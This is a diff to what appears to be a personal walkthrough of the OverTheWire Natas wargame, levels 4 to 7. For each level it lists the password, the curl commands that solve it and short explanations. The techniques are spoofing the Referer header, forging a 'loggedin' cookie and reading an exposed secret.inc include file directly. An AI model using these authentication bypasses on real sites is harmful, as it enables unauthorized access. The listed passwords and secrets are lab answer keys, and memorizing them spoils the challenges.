@@ -14,7 +14,29 @@ level 3		natas3			3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
 command ==> curl -u "natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI" http://natas2.natas.labs.overthewire.org/files/users.txt | cat
 
 level 4		natas4			QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
+note : A robots.txt file is a plain text file that a website uses to communicate with web crawlers and other automated robots. Its primary purpose is to tell these bots which parts of the website they are and are not allowed to access.
 command ==> curl -u "natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH" http://natas3.natas.labs.overthewire.org/robots.txt
 command ==> curl -u "natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH" http://natas3.natas.labs.overthewire.org/s3cr3t/
 command ==> curl -u "natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH" http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt | cat
+
+level 5 	natas5			0n35PkggAPm2zbEpOU802c0x0Msn1ToK
+note: The Referer header is a standard part of an HTTP request that tells the server which page the user was on before they navigated to the current one. The server is checking this header for authorization.
+command ==> curl -u "natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ" -H "Referer: http://natas5.natas.labs.overthewire.org/" http://natas4.natas.labs.overthewire.org/
+
+level 6		natas6			0RoJwHdSKWFTYR5WuiAewauSuNaBXned
+note: 	This challenge is about session management. The server is telling you "Access disallowed. You are not logged in," which means it needs some sort of flag to know that you've been authenticated. This flag is almost always a cookie.
+	A cookie is a small piece of data that a server sends to a user's web browser and that the browser stores. The browser then sends the cookie back with every subsequent request to that same server.
+	Your task is to figure out what cookie the server is looking for and send it with your curl request.
+command ==> curl -v -u "natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK" http://natas5.natas.labs.overthewire.org
+command ==> curl -u "natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK" -b "loggedin=1" http://natas5.natas.labs.overthewire.org
+
+level 7 	natas7			bmg8SvU1LizuWjx3y7xkNERkHxGre0GS		
+note:	The server-side PHP code clearly shows how the password is revealed. It checks if a variable $secret is equal to the value you submit through the form. The $secret variable itself is defined inside the file includes/secret.inc.
+	The password is not in the source code; it's the secret value that you need to find. The server is configured to include a separate file, but it may not be configured to prevent you from accessing that file directly.
+	Your task is to bypass the form and directly request the includes/secret.inc file to read its contents.
+
+	$secret ="FOEIUWGHFEEUHOFUOIU"
+command ==> curl -u "natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned" http://natas6.natas.labs.overthewire.org/includes/secret.inc
+command ==> curl -u "natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned" -X POST -d "secret=FOEIUWGHFEEUHOFUOIU&submit=1" http://natas6.natas.labs.overthewire.org
+
 
